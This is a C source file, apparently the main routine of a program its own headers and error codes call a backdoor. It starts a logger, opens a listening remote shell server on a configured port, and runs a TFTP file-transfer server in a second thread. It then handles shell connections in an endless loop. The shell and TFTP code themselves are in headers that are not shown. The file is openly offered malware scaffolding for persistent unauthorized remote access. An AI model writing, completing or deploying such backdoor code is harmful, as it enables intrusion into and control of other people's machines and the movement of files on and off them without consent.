#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <assert.h>

#include "common.h"
#include "shell.h"
#include "logger.h"
#include "tftp.h"
#include "backdoor.h"

#define PTHREAD_CREATE_SUCCESS (0)

static void *start_tftp_server(void *arg)
{
    assert(arg != NULL);
    return_code_t result = RC_UNINITIALIZED;
    int32_t tftp_server = *((int32_t *)arg);

    result = tftp__run_server(tftp_server);
    if (RC_SUCCESS != result){
        goto l_cleanup;
    }

    result = RC_SUCCESS;
l_cleanup:
    return (void *)result;
}

static return_code_t run_shell_server(int32_t shell_server_socket)
{
    return_code_t result = RC_UNINITIALIZED;

    while (true){
        result = shell__handle_new_connection(shell_server_socket);
        if (RC_SUCCESS != result){
            goto l_cleanup;
        }
    }

l_cleanup:
    return result;
}

int main(void)
{
    return_code_t result = RC_UNINITIALIZED;
    int32_t shell_server = -1;
    int32_t tftp_server = -1;
    pthread_t tftp_tid = 0;
    int32_t temp_result = -1;

    result = logger__init_logger(LOG_PATH);
    if (RC_SUCCESS != result){
        goto l_cleanup;
    }

    result = shell__init_server(SHELL_LISTENING_PORT, &shell_server);
    if (RC_SUCCESS != result){
        goto l_cleanup;
    }

    result = tftp__init_server(TFTP_REQUESTS_PORT, &tftp_server);
    if (RC_SUCCESS != result){
        goto l_cleanup;
    }

    temp_result = pthread_create(&tftp_tid, NULL, &start_tftp_server, (void *)&tftp_server);
    if (PTHREAD_CREATE_SUCCESS != temp_result){
        handle_perror("Pthread create failed", RC_BACKDOOR__MAIN__PTHREAD_CREATE_FAILED);
    }

    result = run_shell_server(shell_server);

l_cleanup:
    if (-1 != shell_server){
        shell__destroy_server(&shell_server);
    }
    if (-1 != tftp_server){
        tftp__destroy_server(&tftp_server);
    }
    logger__destory_logger();
    
    return (int)result;
}
